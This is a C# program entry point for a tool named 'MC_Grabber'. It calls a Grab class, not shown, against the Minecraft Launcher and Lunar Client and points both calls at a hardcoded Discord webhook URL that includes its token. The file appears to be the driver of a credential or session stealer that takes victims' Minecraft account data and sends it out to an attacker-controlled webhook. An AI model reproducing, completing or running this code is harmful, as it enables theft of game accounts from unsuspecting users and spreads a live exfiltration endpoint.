using System;

namespace MC_Grabber
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("---> Works Only With Minecraft Launcher & Lunar.");
            Console.WriteLine("");
            Console.WriteLine("---> User Should Launch With Forge / Vanilla / ETC.");
            Grab grabber = new Grab();
            grabber.Minecraft("https://discord.com/api/webhooks/1053861292999463013/JjbXsCund6cNVvlEU1xmpq8VZgGPscNoCPAKF2ZxdN3rJSuKEZSMEl8oDUNeTnbe3pyd");
            grabber.Lunar("https://discord.com/api/webhooks/1053861292999463013/JjbXsCund6cNVvlEU1xmpq8VZgGPscNoCPAKF2ZxdN3rJSuKEZSMEl8oDUNeTnbe3pyd");
        }
    }
}
